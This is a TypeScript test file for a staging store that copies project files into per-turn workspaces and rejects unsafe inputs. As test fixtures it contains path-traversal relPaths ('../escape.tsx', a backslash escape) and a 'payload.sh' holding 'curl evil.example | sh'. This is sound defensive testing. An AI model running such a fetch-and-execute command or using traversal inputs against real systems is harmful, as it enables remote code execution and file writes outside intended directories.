import { afterAll, describe, expect, test } from "bun:test";
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { parsePageSlug } from "entities/page";
import type { PageSlug } from "entities/page";
import type { Clock } from "infrastructure/clock";
import { durableFileWrite } from "infrastructure/durability";
import {
  FsAccessError,
  IdentityChangedError,
  LeafRejectedError,
  PathRuleError,
  type SafeFsStat,
  UnknownNamespaceError,
  UnsafeHardlinkError,
} from "store/safe-fs";

import type {
  CreateTurnWorkspaceInput,
  StagedTurnReadSet,
  StagingFsDeps,
  StagingStoreDeps,
} from "../types";
import { computeProjectKey } from "./project-key";
import {
  InvalidIdentityError,
  TurnJsonWriteError,
  WorkspaceCollisionError,
  createStagingStore,
  nodeStagingFsDeps,
  turnDir,
  turnJsonPath,
  turnWorkspaceDir,
} from "./staging-store";

const PROJECT_ROOT = "/home/alice/project";
const PROJECT_ID = "0190fc4a-8b5c-7d3e-8a91-6f2e4c7b5d10";
const TURN_ID = "0190fc4a-8b5c-7d3e-8a91-6f2e4c7b5d20";
const CHAT_ID = "0190fc4a-8b5c-7d3e-8a91-6f2e4c7b5d30";
const USER_STATE_ROOT = "/state";

const frozenClock: Clock = { now: () => new Date("2026-07-20T10:00:00.000Z") };

function mustSlug(raw: string): PageSlug {
  const slug = parsePageSlug(raw);
  if (slug instanceof Error) throw slug;
  return slug;
}
// Still needed for `pins` — page comments logs stay pageSlug-keyed even though the tree
// files themselves (this file's whole subject) are relPath-keyed, never slug-keyed.
const homeSlug = mustSlug("home");

// ---- in-memory fs -----------------------------------------------------------------

/**
 * An in-memory `StagingFsDeps` plus a source table, so the tests drive collision, drift,
 * and hardlink rejection without touching a real volume. Mirrors `store/trust`'s
 * `memoryFs` test helper.
 */
function memoryStagingFs(sources: Record<string, SeededSource> = {}) {
  const dirs = new Set<string>(["/"]);
  const files = new Map<string, Uint8Array>();
  const openCalls: string[] = [];
  let sinksOpened = 0;
  let bytesWritten = 0;
  const statOverride = new Map<string, () => SafeFsStat | FsAccessError>();

  function baseStat(absPath: string, bytes: Uint8Array): SafeFsStat {
    const seeded = sources[absPath];
    return {
      isFile: true,
      isDirectory: false,
      isSymbolicLink: false,
      isSpecial: false,
      nlink: seeded?.nlink ?? 1,
      dev: 1n,
      ino: seeded?.ino ?? BigInt(Buffer.from(absPath).reduce((sum, b) => sum + b, 1)),
      size: bytes.byteLength,
      mtimeNs: 0n,
    };
  }

  const deps: StagingFsDeps = {
    mkdirAll(absPath) {
      dirs.add(absPath);
      return undefined;
    },
    mkdirNew(absPath) {
      if (dirs.has(absPath))
        return new FsAccessError({ op: "mkdir", path: absPath, code: "EEXIST" });
      dirs.add(absPath);
      return undefined;
    },
    openSource(absPath) {
      openCalls.push(absPath);
      const seeded = sources[absPath];
      if (seeded === undefined)
        return new FsAccessError({ op: "open", path: absPath, code: "ENOENT" });

      let served = false;
      let statCalls = 0;
      return {
        stat: () => {
          statCalls += 1;
          const override = statOverride.get(absPath);
          if (override !== undefined && statCalls > 1) return override();
          return baseStat(absPath, seeded.bytes);
        },
        read: () => {
          if (served) return null;
          served = true;
          return seeded.bytes;
        },
        close: () => {},
      };
    },
    createNewSink(absPath) {
      sinksOpened += 1;
      if (files.has(absPath))
        return new FsAccessError({ op: "create", path: absPath, code: "EEXIST" });
      const chunks: Uint8Array[] = [];
      return {
        write: (chunk) => {
          bytesWritten += chunk.byteLength;
          chunks.push(chunk);
          return undefined;
        },
        close: () => {
          files.set(absPath, Buffer.concat(chunks));
          return undefined;
        },
      };
    },
    createHash() {
      const hasher = crypto.createHash("sha256");
      return {
        update: (chunk) => void hasher.update(chunk),
        digestHex: () => hasher.digest("hex"),
      };
    },
    removeTree(absPath) {
      // Platform-neutral prefix check: `path.join`-built keys use `path.sep` (backslash on
      // Windows), not a hardcoded `/` — a bug this file's own `retireWorkspace` coverage
      // exposed (a nested subdirectory's removal was silently never observed on Windows).
      for (const key of [...files.keys()])
        if (key === absPath || key.startsWith(`${absPath}${path.sep}`)) files.delete(key);
      for (const key of [...dirs.keys()])
        if (key === absPath || key.startsWith(`${absPath}${path.sep}`)) dirs.delete(key);
    },
  };

  return {
    deps,
    dirs,
    files,
    openCalls,
    sinksOpened: () => sinksOpened,
    bytesWritten: () => bytesWritten,
    /** Make the SECOND `stat()` call on this source report drifted identity/size. */
    driftAfterFirstStat(absPath: string, override: () => SafeFsStat) {
      statOverride.set(absPath, override);
    },
  };
}

function memoryDurableWriter() {
  const files = new Map<string, Uint8Array>();
  let failure: Error | null = null;
  return {
    writer: (absPath: string, bytes: Uint8Array) => {
      if (failure !== null) return failure;
      files.set(absPath, bytes);
      return undefined;
    },
    files,
    fail: (error: Error) => {
      failure = error;
    },
  };
}

function depsOver(input: {
  fs: StagingFsDeps;
  durableWrite: (absPath: string, bytes: Uint8Array) => Error | undefined;
}): StagingStoreDeps {
  return {
    userStateRoot: USER_STATE_ROOT,
    clock: frozenClock,
    fs: input.fs,
    durableWrite: input.durableWrite,
  };
}

const HOME_TSX = new TextEncoder().encode("export const meta = { title: 'Home' }\n");
const ABOUT_TSX = new TextEncoder().encode("export const meta = { title: 'About' }\n");
const MANIFEST = new TextEncoder().encode(JSON.stringify({ pages: ["home", "about"] }));
const RUNTIME_MD = new TextEncoder().encode("# runtime\n");
const RUNTIME_DTS = new TextEncoder().encode("export type Foo = string\n");

/** A plausible send-time read set (turn-durability §7.2 step 4): one present tree file, one
 * expected-absent entry for a potential new target, the captured chat's append base, and
 * one contributing comments log. */
function sampleReadSet(): StagedTurnReadSet {
  return {
    manifest: { sha256: "a".repeat(64), size: 128 },
    designFiles: [
      { relPath: "pages/home.tsx", snapshot: { sha256: "b".repeat(64), size: 256 } },
      { relPath: "pages/about.tsx", snapshot: null },
    ],
    chat: { length: 512, prefixSha256: "c".repeat(64) },
    pins: [{ pageSlug: homeSlug, base: { length: 64, prefixSha256: "d".repeat(64) } }],
  };
}

function validInput(overrides: Partial<CreateTurnWorkspaceInput> = {}): CreateTurnWorkspaceInput {
  return {
    canonicalProjectRoot: PROJECT_ROOT,
    projectId: PROJECT_ID,
    turnId: TURN_ID,
    targetChatId: CHAT_ID,
    treeFiles: [
      { relPath: "pages.json", absSourcePath: "/project/pages.json" },
      { relPath: "pages/home.tsx", absSourcePath: "/project/pages/home/page.tsx" },
      { relPath: "pages/about.tsx", absSourcePath: "/project/pages/about/page.tsx" },
    ],
    runtimeDocs: [
      { relPath: "RUNTIME.md", absSourcePath: "/runtime/RUNTIME.md" },
      { relPath: "types/foo.d.ts", absSourcePath: "/runtime/foo.d.ts" },
    ],
    readSet: sampleReadSet(),
    ...overrides,
  };
}

interface SeededSource {
  readonly bytes: Uint8Array;
  readonly nlink?: number;
  readonly ino?: bigint;
}

function seededSources(): Record<string, SeededSource> {
  return {
    "/project/pages.json": { bytes: MANIFEST },
    "/project/pages/home/page.tsx": { bytes: HOME_TSX },
    "/project/pages/about/page.tsx": { bytes: ABOUT_TSX },
    "/runtime/RUNTIME.md": { bytes: RUNTIME_MD },
    "/runtime/foo.d.ts": { bytes: RUNTIME_DTS },
  };
}

const projectKey = computeProjectKey({ canonicalProjectRoot: PROJECT_ROOT, projectId: PROJECT_ID });

describe("createTurnWorkspace — turn-durability §6.2/§7.2", () => {
  test("stages the whole tree at design/<relPath> (pages.json + every page) and every runtime doc while hashing", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput());
    if (result instanceof Error) throw result;

    expect(result.turnId).toBe(TURN_ID);
    expect(result.root).toBe(turnWorkspaceDir(USER_STATE_ROOT, projectKey, TURN_ID));
    expect(result.turnJsonPath).toBe(turnJsonPath(USER_STATE_ROOT, projectKey, TURN_ID));
    expect(result.files.map((f) => f.relPath).sort()).toEqual([
      "RUNTIME.md",
      "design/pages.json",
      "design/pages/about.tsx",
      "design/pages/home.tsx",
      "types/foo.d.ts",
    ]);

    const home = result.files.find((f) => f.relPath === "design/pages/home.tsx");
    if (home === undefined) throw new Error("home page missing");
    expect(home.namespace).toBe("design-source");
    expect(home.sha256).toBe(crypto.createHash("sha256").update(HOME_TSX).digest("hex"));
    expect(home.size).toBe(HOME_TSX.byteLength);

    const manifest = result.files.find((f) => f.relPath === "design/pages.json");
    if (manifest === undefined) throw new Error("manifest missing");
    expect(manifest.namespace).toBe("design-source");
    expect(manifest.sha256).toBe(crypto.createHash("sha256").update(MANIFEST).digest("hex"));

    const dts = result.files.find((f) => f.relPath === "types/foo.d.ts");
    if (dts === undefined) throw new Error("runtime .d.ts missing");
    expect(dts.namespace).toBe("agent-runtime-doc");
  });

  test("stages a deeply nested tree file at the identical relative path, with a relPath unrelated to any page slug — proving the destination is never derived from a slug", async () => {
    const sources = seededSources();
    sources["/project/lib/nested/theme.ts"] = {
      bytes: new TextEncoder().encode("export const theme = { accent: 'teal' }\n"),
    };
    const memory = memoryStagingFs(sources);
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(
      validInput({
        treeFiles: [
          ...validInput().treeFiles,
          { relPath: "lib/nested/theme.ts", absSourcePath: "/project/lib/nested/theme.ts" },
        ],
      }),
    );
    if (result instanceof Error) throw result;

    expect(result.files.map((f) => f.relPath)).toContain("design/lib/nested/theme.ts");
    // The immediate parent directory is created via `mkdirAll` (recursive by contract — the
    // in-memory fake only records the exact path it is asked to create, not synthetic
    // ancestors, so this checks the one call `stageAllFiles` actually makes).
    expect(memory.dirs.has(path.join(result.root, "design", "lib", "nested"))).toBe(true);
    const staged = memory.files.get(path.join(result.root, "design", "lib", "nested", "theme.ts"));
    if (staged === undefined) throw new Error("nested tree file was not written to disk");
    expect(new TextDecoder().decode(staged)).toBe("export const theme = { accent: 'teal' }\n");
  });

  test("a tree file named REATOM.md stays inside design/ and never shadows the root-level runtime doc copy of the same name", async () => {
    const sources = seededSources();
    sources["/project/REATOM.md"] = {
      bytes: new TextEncoder().encode("# design-tree REATOM notes\n"),
    };
    sources["/runtime/REATOM.md"] = { bytes: new TextEncoder().encode("# runtime REATOM doc\n") };
    const memory = memoryStagingFs(sources);
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(
      validInput({
        treeFiles: [
          { relPath: "pages.json", absSourcePath: "/project/pages.json" },
          { relPath: "REATOM.md", absSourcePath: "/project/REATOM.md" },
        ],
        runtimeDocs: [{ relPath: "REATOM.md", absSourcePath: "/runtime/REATOM.md" }],
      }),
    );
    if (result instanceof Error) throw result;

    expect(result.files.some((f) => f.relPath === "design/REATOM.md")).toBe(true);
    expect(result.files.some((f) => f.relPath === "REATOM.md")).toBe(true);

    const treeCopy = memory.files.get(path.join(result.root, "design", "REATOM.md"));
    const rootCopy = memory.files.get(path.join(result.root, "REATOM.md"));
    if (treeCopy === undefined || rootCopy === undefined)
      throw new Error("expected both copies on disk");
    expect(new TextDecoder().decode(treeCopy)).toBe("# design-tree REATOM notes\n");
    expect(new TextDecoder().decode(rootCopy)).toBe("# runtime REATOM doc\n");
  });

  test("runtime docs stay BESIDE the tree, never inside it", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput());
    if (result instanceof Error) throw result;

    expect(memory.files.has(path.join(result.root, "RUNTIME.md"))).toBe(true);
    expect(memory.files.has(path.join(result.root, "design", "RUNTIME.md"))).toBe(false);
  });

  test("rejects a tree file whose relPath escapes the tree with `..`, before opening its source", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(
      validInput({
        treeFiles: [{ relPath: "../escape.tsx", absSourcePath: "/escape.tsx" }],
      }),
    );
    // `validateRelativePath` — not a hand-rolled `.split("/").includes("..")` scan, which
    // only covers one of the ten §5.1 rejection classes (review finding #1) — is what
    // actually rejects this: the raw component walk's `DOT_COMPONENT` class.
    expect(result).toBeInstanceOf(PathRuleError);
    if (!(result instanceof Error)) throw new Error("expected a rejection");
    expect(result._tag).toBe("PathRuleError");
    expect((result as PathRuleError).code).toBe("DOT_COMPONENT");
    expect(memory.openCalls).not.toContain("/escape.tsx");
  });

  // Review finding #1 (Important, controller-overridden brief): on Windows, a hand-rolled
  // `relPath.split("/").includes("..")` guard NEVER sees `..\\..\\evil.tsx` — there is no
  // `/` in the string, so `split("/")` yields exactly one component. `classifyWorkspace`
  // then still sees `design/..\..\evil.tsx` as two `/`-delimited components and returns
  // `design-source`, and `path.join` normalizes the backslashes on win32 — landing the file
  // OUTSIDE the workspace root. `validateRelativePath`'s `BACKSLASH` check (it runs before
  // any component split, on the raw string) closes this.
  test("rejects a tree file whose relPath carries a Windows backslash separator (the concrete escape a `..`-only guard misses), before opening its source", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(
      validInput({
        treeFiles: [{ relPath: "..\\..\\evil.tsx", absSourcePath: "/evil.tsx" }],
      }),
    );
    expect(result).toBeInstanceOf(PathRuleError);
    if (!(result instanceof Error)) throw new Error("expected a rejection");
    expect(result._tag).toBe("PathRuleError");
    expect((result as PathRuleError).code).toBe("BACKSLASH");
    expect(memory.openCalls).not.toContain("/evil.tsx");
  });

  // Review finding #2: the runtime-docs loop had no traversal guard of its own — it is
  // pre-existing code the brief told this task to leave alone, but `stageOne` (the helper
  // findings 1/2 share, promoted finding #3) now covers both call sites identically, so this
  // pins that the second loop is not silently exempt.
  test("rejects a runtime-doc relPath that escapes with a leading `..`, before opening its source", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(
      validInput({
        runtimeDocs: [{ relPath: "../evil.d.ts", absSourcePath: "/evil.d.ts" }],
      }),
    );
    expect(result).toBeInstanceOf(PathRuleError);
    if (!(result instanceof Error)) throw new Error("expected a rejection");
    expect(result._tag).toBe("PathRuleError");
    expect((result as PathRuleError).code).toBe("DOT_COMPONENT");
    expect(memory.openCalls).not.toContain("/evil.d.ts");
  });

  test("writes exactly S bytes once, with no hardlinks (projections §16.3)", async () => {
    const sources = seededSources();
    const memory = memoryStagingFs(sources);
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput());
    if (result instanceof Error) throw result;

    const s = Object.values(sources).reduce((sum, src) => sum + src.bytes.byteLength, 0);
    expect(result.totalBytes).toBe(s);
    // Every source opened exactly once — a copy, never a link, never a second read pass.
    expect(memory.openCalls.sort()).toEqual(Object.keys(sources).sort());
    expect(memory.bytesWritten()).toBe(s);
    // One sink per staged file (5 sources — `pages.json` is now an ordinary copied tree
    // file, never written inline).
    expect(memory.sinksOpened()).toBe(5);
  });

  test("refuses to reuse an existing turn path and never touches it (WorkspaceCollisionError)", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const first = await store.createTurnWorkspace(validInput());
    if (first instanceof Error) throw first;
    const filesAfterFirst = new Map(memory.files);

    const second = await store.createTurnWorkspace(validInput());
    expect(second).toBeInstanceOf(WorkspaceCollisionError);
    // The original workspace and turn.json are completely untouched by the refused retry.
    expect(memory.files).toEqual(filesAfterFirst);
  });

  test("a different turnId under the same project stages independently", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const first = await store.createTurnWorkspace(validInput());
    if (first instanceof Error) throw first;
    const second = await store.createTurnWorkspace(
      validInput({ turnId: "0190fc4a-8b5c-7d3e-8a91-6f2e4c7b5d21" }),
    );
    if (second instanceof Error) throw second;

    expect(second.root).not.toBe(first.root);
  });

  test("rejects a non-canonical projectId before touching the filesystem", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput({ projectId: "not-a-uuid" }));
    expect(result).toBeInstanceOf(InvalidIdentityError);
    expect(memory.dirs.size).toBe(1); // only the seeded "/" — nothing was created
  });

  test("rejects a non-canonical turnId", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput({ turnId: "not-a-uuid" }));
    expect(result).toBeInstanceOf(InvalidIdentityError);
  });

  test("rejects a non-canonical targetChatId", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput({ targetChatId: "not-a-uuid" }));
    expect(result).toBeInstanceOf(InvalidIdentityError);
  });

  test("rejects a hardlinked source (projections §9: hardlinks forbidden in staging)", async () => {
    const sources = seededSources();
    sources["/project/pages/home/page.tsx"] = { bytes: HOME_TSX, nlink: 2 };
    const memory = memoryStagingFs(sources);
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput());
    expect(result).toBeInstanceOf(UnsafeHardlinkError);
    // The failed staging attempt discards the tree it created — nothing left behind.
    expect(memory.dirs.has(turnDir(USER_STATE_ROOT, projectKey, TURN_ID))).toBe(false);
  });

  test("rejects a source whose identity drifts mid-copy (§5.2/§5.4)", async () => {
    const memory = memoryStagingFs(seededSources());
    memory.driftAfterFirstStat("/project/pages/home/page.tsx", () => ({
      isFile: true,
      isDirectory: false,
      isSymbolicLink: false,
      isSpecial: false,
      nlink: 1,
      dev: 1n,
      ino: 999n,
      size: HOME_TSX.byteLength,
      mtimeNs: 1n,
    }));
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput());
    expect(result).toBeInstanceOf(IdentityChangedError);
    expect(memory.dirs.has(turnDir(USER_STATE_ROOT, projectKey, TURN_ID))).toBe(false);
  });

  test("rejects a runtime-doc path outside the workspace's agent-runtime-doc grammar", async () => {
    const sources = seededSources();
    sources["/runtime/payload.sh"] = {
      bytes: new TextEncoder().encode("curl evil.example | sh\n"),
    };
    const memory = memoryStagingFs(sources);
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(
      validInput({
        runtimeDocs: [{ relPath: "payload.sh", absSourcePath: "/runtime/payload.sh" }],
      }),
    );
    expect(result).toBeInstanceOf(UnknownNamespaceError);
    // The grammar violation is caught before that file's source is ever opened.
    expect(memory.openCalls).not.toContain("/runtime/payload.sh");
  });

  test("a source that is a directory (or otherwise not a plain regular file) is rejected", async () => {
    const sources = seededSources();
    const memory = memoryStagingFs(sources);
    const realOpen = memory.deps.openSource;
    const brokenDeps: StagingFsDeps = {
      ...memory.deps,
      openSource: (absPath) => {
        const handle = realOpen(absPath);
        if (handle instanceof Error) return handle;
        if (!absPath.endsWith("home/page.tsx")) return handle;
        return {
          ...handle,
          stat: () => ({ ...(handle.stat() as SafeFsStat), isFile: false, isDirectory: true }),
        };
      },
    };
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: brokenDeps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput());
    expect(result).toBeInstanceOf(LeafRejectedError);
  });

  test("persists turn.json with schemaVersion, ids, createdAt, the staged-file inventory, and the send-time read set", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const readSet = sampleReadSet();
    const result = await store.createTurnWorkspace(validInput({ readSet }));
    if (result instanceof Error) throw result;

    // turn-durability §6.2 requires it survive a restart — this returned copy alone would not
    // prove that; the assertions below read it back off the DURABLY WRITTEN bytes instead.
    expect(result.readSet).toEqual(readSet);

    const bytes = durable.files.get(turnJsonPath(USER_STATE_ROOT, projectKey, TURN_ID));
    if (bytes === undefined) throw new Error("turn.json was not persisted");
    const record = JSON.parse(new TextDecoder().decode(bytes)) as Record<string, unknown>;
    // `turn.json` is plain JSON (neither TOML nor JSONL) — storage-identity §12 names its
    // version field `schemaVersion`, not `formatVersion` (finding #4's naming half).
    expect(record.schemaVersion).toBe(1);
    expect(record.turnId).toBe(TURN_ID);
    expect(record.projectId).toBe(PROJECT_ID);
    expect(record.targetChatId).toBe(CHAT_ID);
    expect(record.createdAt).toBe("2026-07-20T10:00:00.000Z");
    expect(Array.isArray(record.files)).toBe(true);
    // The send-time read set (finding #4's persistence half) survives exactly — this is what
    // makes it available to finalization's CAS after a process restart between admission and
    // finalization, which caller-memory-only storage could never do.
    expect(record.readSet).toEqual(readSet);
  });

  test("a failed turn.json write discards the staged tree and returns TurnJsonWriteError", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    durable.fail(new Error("volume does not support write-through flush"));
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput());
    expect(result).toBeInstanceOf(TurnJsonWriteError);
    expect(memory.dirs.has(turnDir(USER_STATE_ROOT, projectKey, TURN_ID))).toBe(false);
  });

  test("succeeds with a tree that only has the manifest so far (no pages yet) — only the manifest and runtime docs are staged", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(
      validInput({ treeFiles: [{ relPath: "pages.json", absSourcePath: "/project/pages.json" }] }),
    );
    if (result instanceof Error) throw result;
    expect(result.files.map((f) => f.relPath).sort()).toEqual([
      "RUNTIME.md",
      "design/pages.json",
      "types/foo.d.ts",
    ]);
  });

  test("succeeds with a completely empty tree (zero treeFiles, a brand-new project) — only runtime docs are staged", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const result = await store.createTurnWorkspace(validInput({ treeFiles: [] }));
    if (result instanceof Error) throw result;
    expect(result.files.map((f) => f.relPath).sort()).toEqual(["RUNTIME.md", "types/foo.d.ts"]);
    // No `design/` directory is fabricated for an honestly-empty tree.
    expect(memory.dirs.has(path.join(result.root, "design"))).toBe(false);
  });
});

// ---- retireWorkspace (phase-6 blocker B3: the workspace-retirement exposure) -------------

describe("retireWorkspace — turn-durability §5.4/§7.3's release half", () => {
  test("removes the whole turn tree — the staged workspace files AND the turn directory itself", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const workspace = await store.createTurnWorkspace(validInput());
    if (workspace instanceof Error) throw workspace;
    const turnPath = turnDir(USER_STATE_ROOT, projectKey, TURN_ID);
    expect(memory.dirs.has(turnPath)).toBe(true); // sanity: it really was there before retiring

    const retired = await store.retireWorkspace(workspace);
    expect(retired).toBeUndefined();

    expect(memory.dirs.has(turnPath)).toBe(false);
    expect(memory.dirs.has(turnWorkspaceDir(USER_STATE_ROOT, projectKey, TURN_ID))).toBe(false);
    expect([...memory.files.keys()].some((key) => key.startsWith(turnPath))).toBe(false);
  });

  test("is idempotent — retiring an already-retired (or never-created) turn is a no-op, never an error", async () => {
    const memory = memoryStagingFs(seededSources());
    const durable = memoryDurableWriter();
    const store = createStagingStore(depsOver({ fs: memory.deps, durableWrite: durable.writer }));

    const workspace = await store.createTurnWorkspace(validInput());
    if (workspace instanceof Error) throw workspace;

    expect(await store.retireWorkspace(workspace)).toBeUndefined();
    expect(await store.retireWorkspace(workspace)).toBeUndefined(); // second call: already gone

    const neverCreated: typeof workspace = {
      ...workspace,
      turnId: "0190fc4a-8b5c-7d3e-8a91-6f2e4c7b5d99",
      turnJsonPath: turnJsonPath(
        USER_STATE_ROOT,
        projectKey,
        "0190fc4a-8b5c-7d3e-8a91-6f2e4c7b5d99",
      ),
      root: turnWorkspaceDir(USER_STATE_ROOT, projectKey, "0190fc4a-8b5c-7d3e-8a91-6f2e4c7b5d99"),
    };
    expect(await store.retireWorkspace(neverCreated)).toBeUndefined();
  });
});

// ---- the production wiring, against a real volume ----------------------------------

const realRoots: string[] = [];

afterAll(() => {
  for (const root of realRoots) fs.rmSync(root, { recursive: true, force: true });
});

describe("nodeStagingFsDeps + durableFileWrite — against a real volume", () => {
  test("stages a real workspace and durably persists a readable turn.json", async () => {
    const stateRoot = fs.mkdtempSync(path.join(os.tmpdir(), "termcraft-sandbox-state-"));
    const projectRoot = fs.mkdtempSync(path.join(os.tmpdir(), "termcraft-sandbox-project-"));
    const runtimeRoot = fs.mkdtempSync(path.join(os.tmpdir(), "termcraft-sandbox-runtime-"));
    realRoots.push(stateRoot, projectRoot, runtimeRoot);

    const pageSrc = path.join(projectRoot, "home.tsx");
    fs.writeFileSync(pageSrc, "export const meta = { title: 'Home' }\n");
    const runtimeSrc = path.join(runtimeRoot, "RUNTIME.md");
    fs.writeFileSync(runtimeSrc, "# runtime\n");

    const store = createStagingStore({
      userStateRoot: stateRoot,
      clock: frozenClock,
      fs: nodeStagingFsDeps(),
      durableWrite: durableFileWrite,
    });

    const result = await store.createTurnWorkspace(
      validInput({
        canonicalProjectRoot: projectRoot,
        treeFiles: [{ relPath: "pages/home.tsx", absSourcePath: pageSrc }],
        runtimeDocs: [{ relPath: "RUNTIME.md", absSourcePath: runtimeSrc }],
      }),
    );
    if (result instanceof Error) throw result;

    expect(
      fs.readFileSync(path.join(result.root, "design", "pages", "home.tsx"), "utf8"),
    ).toContain("Home");
    expect(fs.readFileSync(path.join(result.root, "RUNTIME.md"), "utf8")).toContain("runtime");
    expect(fs.existsSync(result.turnJsonPath)).toBe(true);
    const record = JSON.parse(fs.readFileSync(result.turnJsonPath, "utf8")) as Record<
      string,
      unknown
    >;
    expect(record.turnId).toBe(TURN_ID);

    // A second attempt at the same turnId is refused and leaves the first workspace intact.
    const collided = await store.createTurnWorkspace(
      validInput({
        canonicalProjectRoot: projectRoot,
        treeFiles: [{ relPath: "pages/home.tsx", absSourcePath: pageSrc }],
        runtimeDocs: [{ relPath: "RUNTIME.md", absSourcePath: runtimeSrc }],
      }),
    );
    expect(collided).toBeInstanceOf(WorkspaceCollisionError);
    expect(fs.existsSync(path.join(result.root, "design", "pages", "home.tsx"))).toBe(true);
  });

  test("retireWorkspace deletes the workspace AND turn.json — the whole turn tree, on a real volume", async () => {
    const stateRoot = fs.mkdtempSync(path.join(os.tmpdir(), "termcraft-sandbox-state-"));
    const projectRoot = fs.mkdtempSync(path.join(os.tmpdir(), "termcraft-sandbox-project-"));
    realRoots.push(stateRoot, projectRoot);

    const pageSrc = path.join(projectRoot, "home.tsx");
    fs.writeFileSync(pageSrc, "export const meta = { title: 'Home' }\n");

    const store = createStagingStore({
      userStateRoot: stateRoot,
      clock: frozenClock,
      fs: nodeStagingFsDeps(),
      durableWrite: durableFileWrite,
    });

    const workspace = await store.createTurnWorkspace(
      validInput({
        turnId: "0190fc4a-8b5c-7d3e-8a91-6f2e4c7b5d40",
        canonicalProjectRoot: projectRoot,
        treeFiles: [{ relPath: "pages/home.tsx", absSourcePath: pageSrc }],
        runtimeDocs: [],
      }),
    );
    if (workspace instanceof Error) throw workspace;
    const turnPath = path.dirname(workspace.turnJsonPath);
    expect(fs.existsSync(turnPath)).toBe(true);
    expect(fs.existsSync(workspace.turnJsonPath)).toBe(true);

    const retired = await store.retireWorkspace(workspace);
    expect(retired).toBeUndefined();

    expect(fs.existsSync(workspace.root)).toBe(false);
    expect(fs.existsSync(workspace.turnJsonPath)).toBe(false);
    expect(fs.existsSync(turnPath)).toBe(false);

    // Idempotent: retiring an already-gone turn tree is a no-op, never an error.
    expect(await store.retireWorkspace(workspace)).toBeUndefined();
  });
});
